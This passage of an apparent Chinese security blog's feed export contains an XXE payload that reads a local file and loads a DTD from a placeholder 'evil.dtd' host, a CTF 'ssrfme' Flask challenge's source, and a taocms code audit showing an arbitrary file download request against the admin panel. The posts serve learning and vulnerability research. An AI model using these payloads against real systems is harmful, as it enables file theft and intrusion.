<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">//payload
<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> 
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">roottag</span> <span class="token punctuation">[</span><span class="token internal-subset">
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">start</span> <span class="token attr-name">"&lt;![CDATA["</span><span class="token punctuation">></span></span>   
&lt;!ENTITY % goodies SYSTEM "file:///d:/test.txt">  
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">end</span> <span class="token attr-name">"]]</span><span class="token punctuation">></span></span>">  
&lt;!ENTITY % dtd SYSTEM "http://ip/evil.dtd"> 
%dtd; </span><span class="token punctuation">]</span><span class="token punctuation">></span></span> 

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>roottag</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&all;">&amp;all;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>roottag</span><span class="token punctuation">></span></span>

//evil.dtd
<span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">all</span> <span class="token attr-name">"%start;%goodies;%end;"</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>tbc..</p>
]]></content>
      <tags>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/rustymoon/2023/10/28/hello-world/</url>
    <content><![CDATA[<p>More info: <a href="https://hexo.io/docs">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>ssrfme</title>
    <url>/rustymoon/2023/12/05/ssrfme/</url>
    <content><![CDATA[<p>do you know ssrf?</p>
<span id="more"></span>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/env python</span>
<span class="token comment"># encoding=utf-8</span>

<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
<span class="token keyword">from</span> flask <span class="token keyword">import</span> request
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> urllib
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> os
<span class="token keyword">import</span> json

<span class="token builtin">reload</span><span class="token punctuation">(</span>sys<span class="token punctuation">)</span>
sys<span class="token punctuation">.</span>setdefaultencoding<span class="token punctuation">(</span><span class="token string">'latin1'</span><span class="token punctuation">)</span>

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
secert_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>


<span class="token keyword">class</span> <span class="token class-name">Task</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>action <span class="token operator">=</span> action
        self<span class="token punctuation">.</span>param <span class="token operator">=</span> param
        self<span class="token punctuation">.</span>sign <span class="token operator">=</span> sign
        self<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> md5<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># SandBox For Remote_Addr</span>
            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">Exec</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
        result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>
        <span class="token keyword">if</span> self<span class="token punctuation">.</span>checkSign<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token string">"scan"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>
                tmpfile <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>
                resp <span class="token operator">=</span> scan<span class="token punctuation">(</span>self<span class="token punctuation">.</span>param<span class="token punctuation">)</span>
                <span class="token keyword">if</span> resp <span class="token operator">==</span> <span class="token string">"Connection Timeout"</span><span class="token punctuation">:</span>
                    result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> resp
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span> resp
                    tmpfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>resp<span class="token punctuation">)</span>
                    tmpfile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
                    result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>
            <span class="token keyword">if</span> <span class="token string">"read"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>
                f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>
                result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>
                result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>
                result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Action Error"</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>
            result<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Sign Error"</span>
        <span class="token keyword">return</span> result

    <span class="token keyword">def</span> <span class="token function">checkSign</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> getSign<span class="token punctuation">(</span>self<span class="token punctuation">.</span>action<span class="token punctuation">,</span> self<span class="token punctuation">.</span>param<span class="token punctuation">)</span> <span class="token operator">==</span> self<span class="token punctuation">.</span>sign<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">True</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>


<span class="token comment"># generate Sign For Action Scan.</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/geneSign"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">geneSign</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    action <span class="token operator">=</span> <span class="token string">"scan"</span>
    <span class="token keyword">return</span> getSign<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/De1ta'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">challenge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    action <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"action"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sign <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"sign"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr
    <span class="token keyword">if</span> waf<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"No Hacker!!!!"</span>
    task <span class="token operator">=</span> Task<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span>
    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>task<span class="token punctuation">.</span>Exec<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"code.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">scan</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>
    socket<span class="token punctuation">.</span>setdefaulttimeout<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">]</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"Connection Timeout"</span>


<span class="token keyword">def</span> <span class="token function">getSign</span><span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>secert_key <span class="token operator">+</span> param <span class="token operator">+</span> action<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>
    check <span class="token operator">=</span> param<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"gopher"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">False</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>(参考一)[<a href="https://www.codenong.com/cs109680676/]">https://www.codenong.com/cs109680676/]</a><br>(参考二)[<a href="https://xz.aliyun.com/t/6050]">https://xz.aliyun.com/t/6050]</a><br>(参考三)[<a href="https://www.cnblogs.com/x1x20z/p/12890700.html]">https://www.cnblogs.com/x1x20z/p/12890700.html]</a><br>(参考四)[<a href="https://www.cnblogs.com/20175211lyz/p/11440316.html]">https://www.cnblogs.com/20175211lyz/p/11440316.html]</a></p>
]]></content>
  </entry>
  <entry>
    <title>taocms审计中2</title>
    <url>/rustymoon/2023/11/19/taocms%E5%AE%A1%E8%AE%A1%E4%B8%AD2/</url>
    <content><![CDATA[<p>不知道怎么回事，本地的taocms审计一本地文档消失了……</p>
<span id="more"></span>

<p><font size="1">原本是打算继续按照文档的顺序来读的，但是实在看得有点艰难，所以就从GUI看起。</font></p>
<hr>
<h1 id="download-init"><a href="#download-init" class="headerlink" title="download &amp; init"></a>download &amp; init</h1><p>环境：用的是windows 11 + phpstudy_pro，Nginx1.15.11，MySQL5.7.26</p>
<ul>
<li>这里需要注意的是要在配置的时候创建一个数据库，后面install用得到。</li>
<li>phpstudy_pro的数据库端口默认3306（其实在数据库配置中也可以看到）。</li>
<li>根目录要到你下载的那个cms源码文件夹，不然可能访问不了（别问我怎么知道的QAQ）</li>
</ul>
<p>看到这个界面就安装成功了:</p>
<img src="/rustymoon/2023/11/19/taocms%E5%AE%A1%E8%AE%A1%E4%B8%AD2/taocms1.png" class title="taocms">

<p>扫描一下：</p>
<img src="/rustymoon/2023/11/19/taocms%E5%AE%A1%E8%AE%A1%E4%B8%AD2/taocms%E6%BC%8F%E6%B4%9E.png" class title="漏洞">

<hr>
<hr>
<h1 id="路由："><a href="#路由：" class="headerlink" title="路由："></a>路由：</h1><blockquote>
<p>taocms 的路由</p>
</blockquote>
<p>前台功能点路由:<code>wap/api.php</code><br>后台功能点路由：<code>admin/admin.php</code></p>
<h2 id="前台"><a href="#前台" class="headerlink" title="前台"></a>前台</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">//api.php
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//包含config.php调用其所含配置</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token constant">SYS_ROOT</span><span class="token operator">.</span><span class="token constant">INC</span><span class="token operator">.</span><span class="token string single-quoted-string">'common.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//同上</span>
<span class="token variable">$ctrl</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctrl'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//request方法传入参数ctrl，$ctrl接收</span>
<span class="token variable">$action</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//同上</span>
<span class="token variable">$m</span><span class="token operator">=</span><span class="token function">ucfirst</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将字符串第一个字符设为大写，为后面类名实例化做准备——类首字母均为大写</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Api'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'Comment'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">die</span><span class="token punctuation">;</span><span class="token comment">//判断是否存在Api和Comment，存在就die</span>
<span class="token variable">$model</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token variable">$m</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//类名实例化</span>
<span class="token comment">//这个实例中$ctrl存在，就在实例基础上调用$ctrl()</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$ctrl</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token variable">$model</span><span class="token operator">-></span><span class="token variable">$ctrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//common.php部分</span>
<span class="token keyword">function</span> <span class="token function-definition function">__autoload</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token variable">$path</span><span class="token operator">=</span><span class="token constant">SYS_ROOT</span><span class="token operator">.</span><span class="token string single-quoted-string">'include/Model/'</span><span class="token operator">.</span><span class="token function">ucfirst</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token operator">.</span> <span class="token string single-quoted-string">'.php'</span><span class="token punctuation">;</span><span class="token comment">//调用include/Model中所有文件功能代码</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		 <span class="token keyword">include</span> <span class="token variable">$path</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="后台"><a href="#后台" class="headerlink" title="后台"></a>后台</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">//admin.php
//与前台一个道理
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建新session</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"../config.php"</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"../include/common.php"</span><span class="token punctuation">;</span>
<span class="token variable">$action</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$ctrl</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctrl'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$id</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword type-casting">array</span><span class="token punctuation">)</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment">//增加校验</span>
<span class="token comment">//请登录</span>

<span class="token comment">//对传入参数的校验</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name static-context">Base</span><span class="token operator">::</span><span class="token function">checkadmin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$ctrl</span><span class="token operator">!=</span><span class="token string single-quoted-string">'login'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$ctrl</span><span class="token operator">!=</span><span class="token string single-quoted-string">'checkUser'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token class-name static-context">Base</span><span class="token operator">::</span><span class="token function">showmessage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"index.php?action=login"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$referInfo</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$referHost</span><span class="token operator">=</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$referInfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$referInfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>:<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$referInfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">:</span><span class="token variable">$referInfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment">//对host和ctrl的校验</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$referHost</span> <span class="token operator">!==</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_HOST'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token variable">$ctrl</span><span class="token operator">!=</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token class-name static-context">Base</span><span class="token operator">::</span><span class="token function">showmessage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'refer error'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'admin.php?action=frame&amp;ctrl=logout'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//如果有$action，就进行实例化便于后续调用</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name static-context">Base</span><span class="token operator">::</span><span class="token function">catauth</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token variable">$model</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token variable">$action</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">,</span><span class="token variable">$ctrl</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token variable">$model</span><span class="token operator">-></span><span class="token variable">$ctrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<hr>
<h1 id="Model"><a href="#Model" class="headerlink" title="Model&#x2F;"></a>Model&#x2F;</h1><h2 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h2><p>前面在文件上传的部分提到过它，但没有来得及更新文档一，文档一就离我而去了。</p>
<br>

<p>根据前面的分析:</p>
<img src="/rustymoon/2023/11/19/taocms%E5%AE%A1%E8%AE%A1%E4%B8%AD2/%E5%88%86%E6%9E%90.png" class title="分析">

<table><tr><td bgcolor="yellow"> <b>action</b> 传入需要实例化的类名， <b>ctrl</b> 传入需要调用的方法。</td></tr></table>

<p>根据file.php提供的线索可以知道，它提供功能给 <strong>文件管理</strong> ,点击已存在的文件：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">//api.php
<span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/admin/admin.php?action=file&amp;ctrl=edit&amp;path=api.php</span> <span class="token http-version property">HTTP/1.1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<br>
<br>

<p>随便新建文件 <code>fly.php</code>，抓包后得到： </p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/admin/admin.php?path=&amp;action=file&amp;ctrl=create&amp;isdir=0&amp;name=fly.php&amp;fbtn=%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">taocms</span></span>

//找了一下，fbtn出现在managerfile.php中，作为input name 和 id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>由上面两个例子可以看到，就如我们所说，path可控所以</p>
<p>修改path再调用存在问题的<code>function download()</code>：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">
<span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/admin/admin.php?path=/rss.php&amp;action=file&amp;ctrl=download</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">taocms</span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>得到</p>
<img src="/rustymoon/2023/11/19/taocms%E5%AE%A1%E8%AE%A1%E4%B8%AD2/download.png" class title="download">

